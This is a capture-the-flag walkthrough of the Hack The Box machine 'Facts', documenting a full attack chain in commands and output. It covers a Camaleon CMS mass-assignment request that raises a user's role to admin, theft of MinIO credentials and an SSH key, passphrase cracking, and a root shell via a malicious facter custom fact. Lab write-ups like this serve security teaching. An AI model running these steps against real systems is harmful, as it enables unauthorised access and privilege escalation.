# Hack The Box — Facts

> **Difficulty:** Easy
> **OS:** Linux  
> **IP:** `10.129.244.96`  
> **Domain:** `facts.htb`

---

# 1. Initial Recon

## Nmap

I started with a full TCP port scan using default scripts and service/version detection:

```
nmap -sC -sV -p- --min-rate=1000 10.129.244.96
```

The scan identified three open ports:

```
22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2
80/tcp    open  http    nginx 1.26.3 (Ubuntu)
54321/tcp open  http    Golang net/http server
```

Port 80 hosts the main web application, while port 54321 appears to be a MinIO service.

I added the target to `/etc/hosts`:

```
echo "10.129.244.96 facts.htb" | sudo tee -a /etc/hosts
```

# 2. Web Enumeration

## Directory Enumeration

I started enumerating the web application using Gobuster:

```
gobuster dir -u http://facts.htb \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
```

Among the discovered paths, the most interesting results were:

|Path|Status|Description|
|---|---|---|
|`/admin`|302|Redirects to `/admin/login`|
|`/search`|200|Search page|
|`/rss`|200|RSS feed|
|`/post`|200|Posts|
|`/welcome`|200|Welcome page|
|`/sitemap`|200|Sitemap|
|`/captcha`|200|CAPTCHA endpoint|

The `/admin` endpoint suggested that the application had an administrative interface.

## Identifying the CMS

I created an account on the website and logged in.

After inspecting the application, I identified the CMS as **Camaleon CMS version 2.9.0**.

This version is affected by **CVE-2025-2304**, which allows mass assignment through user-controlled parameters. This vulnerability can be abused to modify attributes that should not be editable by a regular user.

# 3. Initial Access — Camaleon CMS Privilege Escalation

## Exploiting CVE-2025-2304

I navigated to my profile page and intercepted the password update request using Burp Suite.

Inspecting the request revealed that my account had the `customer` role.

Because of the mass-assignment vulnerability, I could inject an additional parameter into the request and change my account's role to `admin`.

The modified request body was:

```
_method=patch&authenticity_token=<AUTHENTICITY_TOKEN>&password[password]=Password123!&password[password_confirmation]=Password123!&password[role]=admin
```

The important addition was:

```
password[role]=admin
```

After submitting the modified request, I logged in again with my account.

I now had administrative privileges.

# 4. Credential Discovery — MinIO

## Exposed AWS Credentials

With administrator access, I explored the CMS settings.

Under:

```
Settings → General Site → Filesystem Settings
```

I found exposed AWS-compatible storage credentials.

The configuration also revealed that the bucket endpoint was running locally at:

```
http://localhost:54321
```

Since port 54321 had been identified during the initial Nmap scan as MinIO, I configured the AWS CLI to use the discovered credentials.

## Configuring the AWS CLI

I created a dedicated AWS CLI profile named `facts`:

```
aws configure --profile facts
```

I entered the credentials found in the CMS settings:

```
AWS Access Key ID: <AWS_ACCESS_KEY_ID>
AWS Secret Access Key: <AWS_SECRET_ACCESS_KEY>
Default region name: us-east-1
Default output format:
```

I then queried the MinIO service through the target's exposed endpoint:

```
aws --profile facts --endpoint-url=http://facts.htb:54321 s3 ls
```

The command returned two buckets:

```
2025-09-11 08:06:52 internal
2025-09-11 08:06:52 randomfacts
```

The `internal` bucket looked particularly interesting.

## Enumerating the Internal Bucket

I listed its contents:

```
aws --profile facts --endpoint-url=http://facts.htb:54321 s3 ls internal
```

The output revealed several directories and files:

```
PRE .bundle/
PRE .cache/
PRE .ssh/
.bash_logout
.bashrc
.lesshst
.profile
```

The presence of a `.ssh` directory suggested that the bucket contained a user's SSH configuration.

I enumerated it:

```
aws --profile facts --endpoint-url=http://facts.htb:54321 s3 ls internal/.ssh/
```

The directory contained:

```
2026-11-12 03:19:05 82  authorized_keys
2026-11-12 03:19:05 464 id_ed25519
```

I downloaded the private key:

```
aws --profile facts --endpoint-url=http://facts.htb:54321 s3 cp \
s3://internal/.ssh/id_ed25519 ./id_ed25519
```

The file contained an OpenSSH private key. However, it was encrypted with a passphrase, and I did not yet know which user account it belonged to.

# 5. SSH Access — Cracking the Private Key

## Identifying the Key Owner

Normally, `ssh-keygen -y` can derive the public key from a private key. The public key often includes a comment identifying the original user and hostname.

However, because the private key was passphrase-protected, I could not derive the public key immediately.

I first set the correct file permissions:

```
chmod 600 id_ed25519
```

Then I attempted to derive the public key:

```
ssh-keygen -y -f id_ed25519
```

The command prompted for the passphrase and failed:

```
Enter passphrase for "id_ed25519":
Load key "id_ed25519": incorrect passphrase supplied to decrypt private key
```

## Cracking the Passphrase

I extracted a crackable hash from the private key using `ssh2john` and saved it as `hash.txt`.

I then used John the Ripper with the `rockyou.txt` wordlist:

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

John successfully recovered the passphrase:

```
dragonballz (id_ed25519)
```

The passphrase was:

```
dragonballz
```

## Identifying the SSH User

With the passphrase recovered, I ran `ssh-keygen` again:

```
ssh-keygen -y -f id_ed25519
```

This time, the command successfully derived the public key:

```
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINZim+YCgWugu/SWI5x/6QhFIkSyNW4XloQHLlyabkkb trivia@facts.htb
```

The comment revealed the username:

```
trivia
```

## Logging in as Trivia

I used the recovered private key to connect over SSH:

```
ssh -i id_ed25519 trivia@facts.htb
```

After accepting the host key and entering the passphrase, I successfully logged in.

I confirmed the account:

```
id
```

```
uid=1000(trivia) gid=1000(trivia) groups=1000(trivia)
```

# 6. User Flag

After obtaining SSH access as `trivia`, I inspected the home directories:

```
ls -l /home/
```

```
drwxr-x--- 6 trivia  trivia  4096 May 13  2026 trivia
drwxr-xr-x 2 william william 4096 Jan 26  2026 william
```

The `william` home directory contained the user flag.

I read it directly:

```
cat /home/william/user.txt
```

```
USER_FLAG
```

# 7. Privilege Escalation — Facter

## Enumerating Sudo Permissions

I checked which commands the `trivia` user could execute with elevated privileges:

```
sudo -l
```

The output showed:

```
User trivia may run the following commands on facts:

    (ALL) NOPASSWD: /usr/bin/facter
```

This meant that `trivia` could execute `/usr/bin/facter` as root without supplying a password.

## Abusing Custom Facts

`facter` is a system-information gathering tool from the Puppet ecosystem. It collects information about the host, including operating system, hardware, and network configuration.

It also supports custom facts written in Ruby.

Since I could execute `facter` as root and provide a custom facts directory, I could use a Ruby script to execute a command with root privileges.

I created a directory for the custom fact:

```
mkdir /tmp/dotguy
```

Then I created a Ruby script that launches a Bash shell:

```
echo 'exec("/bin/bash")' > /tmp/dotguy/exploit.rb
```

Finally, I executed `facter` with the custom directory using sudo:

```
sudo facter --custom-dir /tmp/dotguy
```

The custom Ruby fact executed with root privileges, giving me a root shell:

```
root@facts:/home/trivia#
```

# 8. Root Flag

With root access, I moved to the root home directory and inspected its contents:

```
cd ~
ls
```

```
minio-binaries
ministack
root.txt
snap
```

I retrieved the root flag:

```
cat root.txt
```

```
ROOT_FLAG
```

---

# Attack Chain

1. **Reconnaissance:** Identified SSH, nginx, and MinIO running on the target.
    
2. **Web Enumeration:** Discovered the Camaleon CMS administrative interface.
    
3. **Privilege Escalation:** Abused CVE-2025-2304 to change a regular user's role to administrator.
    
4. **Credential Discovery:** Retrieved AWS-compatible credentials from the CMS filesystem settings.
    
5. **MinIO Enumeration:** Accessed the `internal` bucket and downloaded an encrypted SSH private key.
    
6. **Passphrase Cracking:** Used `ssh2john` and John the Ripper to recover the private key's passphrase.
    
7. **User Access:** Identified the key owner as `trivia` and logged in over SSH.
    
8. **Root Access:** Abused the passwordless sudo permission for `facter` to execute a custom Ruby fact as root.
    

# Vulnerabilities

|Vulnerability|Description|
|---|---|
|CVE-2025-2304|Camaleon CMS mass assignment allowing unauthorized modification of account attributes, including the user role|
|Exposed storage credentials|AWS-compatible credentials exposed through the CMS filesystem settings|
|Insecure object storage access|MinIO exposed an internal bucket containing sensitive SSH files|
|Weak SSH key passphrase|The encrypted private key used a passphrase recoverable with a common wordlist|
|Unsafe sudo configuration|`facter` could be executed as root with a user-controlled custom facts directory|

# Key Takeaways

- Always enumerate administrative interfaces and inspect the underlying CMS version.
    
- Mass-assignment vulnerabilities can allow privilege escalation when sensitive attributes are not protected.
    
- Application configuration pages can expose credentials for external services and internal infrastructure.
    
- S3-compatible storage services such as MinIO should be checked for improperly exposed buckets and sensitive files.
    
- Encrypted SSH private keys should still be treated as sensitive; weak passphrases can be recovered offline.
    
- Always inspect `sudo -l` after obtaining a shell. Tools that support user-defined scripts or plugins can become privilege escalation vectors when executed as root.
    

# Flags

|Flag|Location|User|
|---|---|---|
|User|`/home/william/user.txt`|`william`|
|Root|`/root/root.txt`|`root`|